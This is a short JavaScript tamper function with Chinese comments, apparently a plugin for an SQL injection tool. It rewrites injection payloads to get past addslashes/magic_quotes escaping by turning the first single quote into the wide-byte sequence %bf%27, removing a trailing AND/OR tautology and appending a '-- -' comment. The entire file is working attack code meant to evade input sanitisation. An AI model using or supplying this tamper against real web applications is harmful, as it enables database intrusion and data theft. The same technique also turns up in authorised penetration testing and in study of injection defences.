//@name: 宽字节绕引号转义
//@usage: payload
//@enable: false
//@description: 首个单引号→%bf%27宽字节并补通用注释（绕magic_quotes/addslashes）
function tamper(payload){
    if (!payload) { return payload; }
    var found = false, retVal = '';
    for (var i = 0; i < payload.length; i++){
        var c = payload.charAt(i);
        if (c === "'" && !found){ retVal += '%bf%27'; found = true; }
        else { retVal += c; }
    }
    if (found){
        var stripped = retVal.replace(/\s*(AND|OR)[\s(]+([^\s]+)\s*(=|LIKE)\s*\2/i, '');
        if (stripped !== retVal){ retVal = stripped + '-- -'; }
        else if (retVal.indexOf('#') < 0 && retVal.indexOf('--') < 0 && retVal.indexOf('/*') < 0){ retVal += '-- -'; }
    }
    return retVal;
}